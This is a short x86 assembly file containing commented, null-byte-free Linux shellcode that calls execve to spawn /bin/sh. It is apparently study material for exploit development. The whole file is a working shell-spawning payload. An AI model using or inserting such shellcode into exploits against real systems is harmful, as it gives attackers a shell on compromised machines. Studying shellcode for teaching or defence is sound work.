; non-NULL shellcode
global _start
section .text

_start:
  ; execve(program, NULL, NULL)
  xor  ecx, ecx
  xor  edx, edx  
  push edx        ; push NULL onto stack 
  push 0x68732f6e ; push 'n/sh'
  push 0x69622f2f ; push '//bi'
  mov  ebx, esp   ; get pointer to string on stack
  xor  eax, eax
  mov  al, 0xb    ; eax = sys_execve syscall number
  int  0x80